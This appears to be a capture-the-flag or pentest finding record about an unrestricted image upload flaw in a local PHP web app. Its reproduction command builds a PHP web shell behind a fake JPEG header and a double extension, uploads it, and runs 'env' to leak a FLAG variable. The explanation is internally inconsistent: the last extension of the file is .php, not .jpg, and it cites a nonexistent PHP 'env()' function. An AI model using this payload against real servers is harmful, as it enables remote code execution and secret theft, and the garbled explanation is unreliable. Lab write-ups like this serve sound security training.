findings.title: Unrestricted File Upload Leading to RCE and Flag Disclosure
findings.description: The image upload functionality only validates the file extension by checking the last extension in the filename. By uploading a file with a double extension (e.g., test.jpg.php), the validation passes (sees .jpg) but Apache executes it as PHP. Additionally, the FLAG environment variable is exposed via PHP's env() function.

reproduction.command: echo -e '\xff\xd8\xff\xe0\n<?php echo system("env"); ?>' > /tmp/test.jpg.php && curl -F 'userfile=@/tmp/test.jpg.php' -F 'submit=Upload Image' http://172.17.0.1:42861/index.php && curl http://172.17.0.1:42861/upload/test.jpg.php
